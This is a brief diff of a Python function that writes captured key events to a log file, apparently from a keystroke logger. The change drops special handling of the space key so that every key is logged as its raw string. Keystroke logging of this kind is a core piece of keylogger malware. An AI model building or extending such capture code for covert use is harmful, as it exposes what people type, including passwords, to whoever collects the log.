@@ -66,12 +66,8 @@ def write_file(key_list, count_line):
             if count_line == NEW_LINE:
                 count_line = 0
                 log.write("\n")
-                
-            space_bar = str(keys).replace("'","")
-            if space_bar.find("space") > 0:
-                log.write(" ")
-            else:
-                log.write(str(keys))
+            
+            log.write(str(keys))
 
 #%%----------------------------------------------------------------------------  
 # Collect events until released
